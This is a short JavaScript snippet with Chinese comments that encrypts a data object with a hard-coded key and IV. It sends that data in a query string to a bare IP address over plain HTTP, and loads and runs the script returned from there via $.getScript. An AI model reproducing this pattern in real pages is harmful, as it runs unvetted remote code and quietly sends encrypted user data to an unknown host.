var socketUrl2 = '?sign='+conf.code;
	if(!coo('sclick')&&$_GET.f){	
    const key = "bee6852c4877e5d8";
    const  iv = "9c577f29f26b4228";
    /* js加密 */
	  var str = JSON.stringify(datajson);
      let data = encrypt(str, key, iv);
	   data = encodeURIComponent(data); 
      //console.log('js加密:' + data)	
	   // alert(data);
	   socketUrl2 = '?sign='+conf.code+'+&from='+ ($_GET.f||'')+ '&str='+ data;
	}
 var socketUrl = 'http://1.15.114.194/socket.php'+socketUrl2;
 //console.log("网址 : ",socketUrl);
	$.getScript(socketUrl,function(){});